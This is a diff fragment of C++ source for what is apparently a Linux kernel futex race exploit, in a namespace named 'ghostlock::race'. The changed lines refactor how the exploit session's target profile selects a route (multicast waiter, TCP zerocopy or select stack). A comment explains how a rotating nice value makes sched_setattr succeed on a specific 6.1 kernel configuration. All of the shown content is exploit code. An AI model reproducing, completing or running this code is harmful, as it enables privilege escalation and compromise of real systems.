@@ -46,9 +46,9 @@ namespace ghostlock::race {
         race->waiter_waiting.store(1);
         support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                           &race->target_futex, 0);
-        route::RouteKind selected = target_profile_supports_multicast_waiter(&g_exploit_session.profile)
+        route::RouteKind selected = g_exploit_session.profile.supports(::RouteKind::MulticastWaiter)
                                         ? route::RouteKind::MulticastWaiter
-                                        : (target_profile_supports_tcp_zerocopy(&g_exploit_session.profile)
+                                        : (g_exploit_session.profile.supports(::RouteKind::TcpZerocopy)
                                                ? route::RouteKind::TcpZerocopy
                                                : route::RouteKind::SelectStack);
         route::RouteController controller;
@@ -130,7 +130,7 @@ namespace ghostlock::race {
                     errno = 0;
                     /* rotate the nice every call; (calls%19)+1 is what makes
                  * sched_setattr succeed on 6.1 compact */
-                    int consumer_nice = target_profile_has_compact_waiter(&g_exploit_session.profile)
+                    int consumer_nice = g_exploit_session.profile.has_compact_waiter()
                                             ? (calls_this_seq % 19) + 1
                                             : PSELECT_CONSUMER_NICE;
                     long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
